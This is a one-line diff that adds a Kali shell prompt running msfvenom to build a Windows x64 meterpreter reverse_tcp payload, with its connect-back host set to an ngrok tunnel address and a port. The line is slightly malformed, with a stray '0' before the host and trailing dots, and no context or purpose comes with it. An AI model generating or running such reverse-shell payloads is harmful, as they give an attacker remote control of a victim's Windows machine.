@@ -1,0 +1,1 @@
+root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0 tcp.ngrok.io LPORT=19336..
